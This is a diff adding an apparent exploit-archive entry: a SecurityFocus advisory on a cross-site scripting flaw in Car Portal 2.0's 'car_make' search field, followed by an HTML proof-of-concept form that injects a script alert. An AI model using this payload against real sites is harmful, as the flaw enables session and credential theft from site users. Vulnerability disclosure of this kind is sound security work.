@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/45092/info
+
+Car Portal is prone to a cross-site-scripting vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Car Portal 2.0 is vulnerable; other versions may also be affected. 
+
+<!--
+TITLE: Car Portal v2.0 "car_make" Cross-Site Scripting Vulnerability
+PRODUCT: Car Portal v2.0
+PRODUCT URL: http://www.netartmedia.net/carsportal/
+RESEARCHERS: underground-stockholm.com
+RESEARCHERS URL: http://underground-stockholm.com/
+-->
+<html>
+<body>
+<form method="post" action="http://[host]/[path]/index.php">
+<input type="hidden" name="ProceedSearch" value="1">
+<input type="hidden" name="mod" value="cars_search">
+<input type="hidden" name="lang" value="en">
+<input type="hidden" name="Step" value="1">
+<input type="hidden" name="car_make" value="<script>alert(1337)</script>">
+<input type="hidden" name="car_model" value="All">
+<input type="hidden" name="car_year_from" value="1983">
+<input type="hidden" name="car_year_to" value="1987">
+<input type="hidden" name="zip" value="">
+<input type="hidden" name="order_by" value="price">
+<input type="submit">
+</form>
+</body>
+</html>
